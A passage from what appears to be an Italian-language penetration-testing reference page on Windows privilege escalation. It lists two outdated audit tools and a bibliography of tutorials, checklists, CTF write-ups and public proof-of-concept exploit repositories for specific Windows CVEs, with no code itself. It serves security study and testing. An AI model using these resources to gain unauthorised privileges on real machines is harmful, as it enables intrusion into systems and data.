[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica le misconfigurations (eseguibile precompiled su github). Non raccomandato. Non funziona bene in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possibili misconfigurations (exe derivato da Python). Non raccomandato. Non funziona bene in Win10.
...
- [1] [Fondamenti dell'escalation dei privilegi su Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevazione dei privilegi sfruttando permessi deboli sulle cartelle](http://www.greyhathacker.net/?p=738)
- [3] [Escalation dei privilegi su Windows - un cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop sull'escalation dei privilegi locali su Windows / Linux](https://github.com/sagishahar/lpeworkshop)
...
- [8] [Guida all'escalation dei privilegi su Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checklist per l'escalation dei privilegi su Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Escalation dei privilegi su Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metodi di escalation dei privilegi su Windows per Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
...
- [13] [HTB Reaper: leak di una format string + BOF dello stack → VirtualAlloc ROP (RCE) e furto del token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
...
- [29] [Pwn2Own con Microslop: concatenamento di race condition del kernel CLDFLT e DirectX per l'LPE su Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un unico I/O Ring per dominarli tutti: una primitiva completa di exploit in lettura/scrittura su Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abusare delle eliminazioni arbitrarie di file per aumentare i privilegi e altri ottimi trucchi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - codice dell'exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Attacchi WSUS Parte 2: CVE-2020-1013, una 1-Day di escalation dei privilegi locali su Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: analisi di Credential Manager e Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC per CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: quando una modifica dell'immagine porta a un'escalation dei privilegi](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
